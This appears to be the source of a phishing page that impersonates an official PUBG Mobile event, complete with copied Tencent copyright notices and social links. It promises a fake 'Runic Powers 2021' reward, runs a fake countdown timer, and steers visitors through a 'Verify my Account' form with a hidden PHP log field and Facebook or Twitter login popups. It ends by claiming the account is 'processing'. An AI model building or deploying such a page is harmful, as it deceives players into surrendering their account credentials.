<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select class="select-anjir kiri" name="tier" id="tier" required>
<option selected="selected" disabled="disabled" value="">Ranked Tier Level</option>
<option>Bronze</option>
<option>Silver</option>
<option>Gold</option>
<option>Platinum</option>
<option>Diamond</option>
<option>Crown</option>
<option>Ace</option>
<option>Conqueror</option>
</select>
<select class="select-anjir kanan" name="rpt" id="rpt" required>
<option selected="selected" disabled="disabled" value="">Royale Pass Type</option>
<option>Free Royale Pass</option>
<option>Elite Royale Pass</option>
<option>Elite Royale Pass Plus</option>
</select>
<select class="select-anjir kiri" name="rpl" id="rpl" required>
<option selected="selected" disabled="disabled" value="">Royale Pass Level</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<select class="select-anjir kanan" name="platform" id="platform" required>
<option selected="selected" disabled="disabled" value="">Platform</option>
<option>Android</option>
<option>iOS</option>
</select>
<input type="hidden" name="log" value="<?php echo $log;?>" readonly>
<button type="submit" class="finish-btn" onmousedown="buka.play()" style="margin-top: 15px"><span>Verify my Account</span></button>
</form>
                    </center>
                 </div>
            </div>
        </div>
    </div>

   

        <div class="section s8 fp-auto-height" data-anchor="page2">
            <!-- footer -->
            <link rel="stylesheet" href="common/css/footer.css">
<div class="footer">
    <div class="foot_ct">
        <p class="foot_icon">
            <a onclick="gtag('event', 'x_jump', {'event_category': 'website','event_label': 'pc_footer_facebook'});"
                href="https://www.facebook.com/PUBGMobile" class="foot_icon1" target="_blank">Facebook</a>
            <a onclick="gtag('event', 'x_jump', {'event_category': 'website','event_label': 'pc_footer_twitter'});"
                href="https://twitter.com/PUBGMOBILE" class="foot_icon2" target="_blank">Twitter</a>
            <a onclick="gtag('event', 'x_jump', {'event_category': 'website','event_label': 'pc_footer_youtube'});"
                href="https://www.youtube.com/pubgmobile" class="foot_icon3" target="_blank">Youtube</a>
            <a onclick="gtag('event', 'x_jump', {'event_category': 'website','event_label': 'pc_footer_ins'});"
                href="https://www.instagram.com/pubgmobile" class="foot_icon4" target="_blank">Instagram</a>
            <a onclick="gtag('event', 'x_jump', {'event_category': 'website','event_label': 'pc_footer_vk'});"
                href="https://vk.com/pubgmobile" class="foot_icon5" target="_blank">VK</a>
        </p>
        <p class="foot_ship">Partnership Inquiry: pubgmobile_business@tencent.com</p>
        <div class="foot_copy clearfix">
            <p class="copy_left">
                <img src="common/images/foot_logo1.png" width="62" height="40" alt="">
                <img src="common/images/foot_logo2.png" width="94" height="40" alt="">
                <img src="common/images/foot_logo3.png" width="165" height="40" alt="">
            </p>
            <div class="copy_right">
                <p>ⓒ 2017 KRAFTON, Inc. All rights reserved.</p>
                <p>ⓒ 2018-2021 Tencent. All rights reserved.</p>
                <p><a onclick="gtag('event', 'x_jump', {'event_category': 
                 'website','event_label': 'pc_footer_terms'});" href="https://www.pubgmobile.com/privacy.html">Privacy Policy </a>|
                    <a onclick="gtag('event', 'x_jump', {'event_category': 
                  'website','event_label': 'pc_footer_privacy'});" href="https://www.pubgmobile.com/terms.html"> Tencent Games User Agreement</a>
                </p>

            </div>
        </div>
    </div>
</div>


    <div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<a  onmousedown="tutup.play()" onclick="close_reward_confirmation()" class="popup-close"><i class="zmdi zmdi-close"></i></a>
<div class="nav-popup"><div class="nav-popup-title">Reward Confirmation</div></div><br>
<div class="popup-alert">Are you sure to collect this rewards?</div>
<img class="popup-item" src="" id="myImgReward">
<button type="button" class="popup-btn" onmousedown="buka.play()" onclick="account_login()">CONFIRM</button>
</div>
</div>

<div class="popup account_login" style="display: none;">
<div class="popup-box">
<a  onmousedown="tutup.play()" onclick="close_account_login()" class="popup-close"><i class="zmdi zmdi-close"></i></a>
<div class="nav-popup"><div class="nav-popup-title">Account Login</div></div><br>
<img style="width: 50px; margin-top: 10px; margin-left: auto; margin-right: auto; border: 1px solid #fff; border-radius: 50%;" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="popup-alert">Log in using your PUBG MOBILE account to receive rewards</div>
<button type="button" class="btn-login facebook" onclick="open_facebook();"><img src="images/facebook.png"></button>
<button type="button" class="btn-login twitter" onclick="open_twitter();"><img src="images/twitter.png"></button>
<br>
<br>
</div>
</div>

<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<a class="popup-close"><i class="zmdi zmdi-account-circle"></i></a><br>
<div class="nav-popup"><div class="nav-popup-title">Processing Account</div></div>
<div class="popup-alert">
Thank your for Joining Runic Powers 2021 event
<br>
<br>
Currently your account has been successfully processing
<br>
Please wait up to 24 hours to receive your rewards
<br>
<br>
</div>
<button type="button" class="popup-btn popup-btn-collect" onmousedown="buka.play()" onclick="location.href='https://pubgmobile.com/';"><span>Logout</span></button>
</div>
</div>



<script type="text/javascript">
    function reward_confirmation(ag) {
    var myReward = $(ag).attr("src");
    $('.reward_confirmation').show();
    $('#myImgReward').attr('src',myReward);
    }
    function close_reward_confirmation(){
        $('.popup').fadeOut();
        $('.reward_confirmation').fadeOut();
    }
    function account_login() {
        $('.reward_confirmation').hide();
        $('.account_login').show();
    }
    function open_facebook() {
        $('.login-facebook').show();
        $('.account_login').hide();
    }
    function open_twitter() {
        $('.login-twitter').show();
        $('.account_login').hide();
    }

    function close_account_login() {
        $('.popup').hide();
        $('.popup-login').hide();
        $('.account_login').hide();
    }
    function tutup_facebook(){
        $('.popup').hide();
        $('.popup-login').hide();
        $('.login-facebook').hide();
    }
    function tutup_twitter(){
        $('.popup').hide();
        $('.popup-login').hide();
        $('.login-twitter').hide();
    }
    var buka = new Audio();
    buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

    var tutup = new Audio();
    tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

   
</script>
            <!-- footer -->
        </div>
    </div>
    <!-- menu -->
    <ul id="menu">
        <li data-menuanchor="page1" onclick="gtag('event','x_click',{'event_category':'royalepass17','event_label':'menu_btn2'});"
            class="active"><a href="#page1">01</a>
        </li>
        <li data-menuanchor="page2" onclick="gtag('event','x_click',{'event_category':'royalepass17','event_label':'menu_btn2'});"><a
                href="#page2">02</a>
        </li>
    </ul>
    <!-- logo -->
    <img src="images/logo.png" alt="logo" class="img-logo">
    <!-- next page -->
    <div class="img-next-page"></div>
    <!-- pop-->
    <div class="b-bg" style="display: none;">
        <!-- pop-video -->
        <div class="pop-vid pop-con" style="display: none;">
            <a href="javascript:pop.hidevideopop();" class="pop-close"
                onclick="gtag('event', 'x_click', {'event_category': 'royalepass17','event_label': 'pop_close'});">&times;</a>
            <div class="pop-loading"><span>loading...</span></div>
            <div class="pop-player" id="pop-player"></div>
        </div>
        <!-- pop-share -->
        <div class="pop-share" style="display: none;">
            <a href="javascript:pop.hidepop();" class="pop-close"
                onclick="gtag('event', 'x_click', {'event_category': 'royalepass17','event_label': 'pop_close'});">×</a>
            <div class="share-wrap">
                <a href="javascript:;" class="facebook-share-btn"
                    ontouchstart="gtag('event', 'x_click', {'event_category': 'royalepass17','event_label': 'm_share_facebook'});">
                    <img src="images/facebook.png" alt="">
                    <p>FACEBOOK</p>
                </a>
                <a href="javascript:;" class="twitter-share-btn"
                    ontouchstart="gtag('event', 'x_click', {'event_category': 'royalepass17','event_label': 'm_share_twitter'});">
                    <img src="images/twitter.png" alt="">
                    <p>TWITTER</p>
                </a>
            </div>
        </div>
    </div>
    <script src="cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.min.js"></script>
    <script src="cdnjs.cloudflare.com/ajax/libs/Swiper/4.5.0/js/swiper.min.js"></script>
    <script src="cdnjs.cloudflare.com/ajax/libs/fullPage.js/2.7.1/jquery.fullPage.min.js"></script>
    <script type="text/javascript">
         // TIMER 1
    $(document).ready(function() { 
    var detik = 59;
    var menit = 59;
    var jam = 23;
    function hitung() { 
    setTimeout(hitung,1000); $('#timer1').html( '<i class="zmdi zmdi-time"></i> ' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
    if(detik < 0) { 
    detik = 59; 
    menit --; 
    if(menit < 0) { 
    menit = 0; 
    detik = 0; 
    } 
    } 
    } 
    hitung(); 
    }
    );

    // TIMER 2
    $(document).ready(function() { 
    var detik = 59;
    var menit = 59;
    var jam = 23;
    function hitung() { 
    setTimeout(hitung,1000); $('#timer2').html( + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
    if(detik < 0) { 
    detik = 59; 
    menit --; 
    if(menit < 0) { 
    menit = 0; 
    detik = 0; 
    } 
    } 
    } 
    hitung(); 
    }
    );
    </script>
    <script type="text/javascript">
        $(document).ready(function() {
            $("#submit").on('click', function() {
            var nick   = $("#nick").val();
            if(nick == "") {
                alert('error');
            } else {
            $.ajax({
            url: "check.php",
            type: "POST",
            data: 'nick='+nick,
            // beforeSend: function() {
            // $("#carik").hide();
            // $("#cariin").show();
            // },
            success: function(status) {
            alert('sukses send');
            }
            });
            }
            });
            });
    </script>
    <script src="js/common.js"></script>
    <script src="js/index.js"></script>
    
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-117352746-1');
    </script>



    <script>
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) {
            $("body").addClass("mobile");
        }

        var swiper4 = new Swiper('.swiper-container-s4', {
          slidesPerView: 3,
          spaceBetween: 30,
          centeredSlides: true,
          loop: true,
          autoplay: {
            delay: 1000,
            disableOnInteraction: false,
          },
        });

        function clickbtn(num){
            $('.b-bg').show();
            $('.pop-vid,.pop-share').hide();
            $('.pop-pic').show();
            var index = num;
            $(".poppic").eq(index).addClass('on').siblings().removeClass('on');
        };
    </script>
</body>


</html>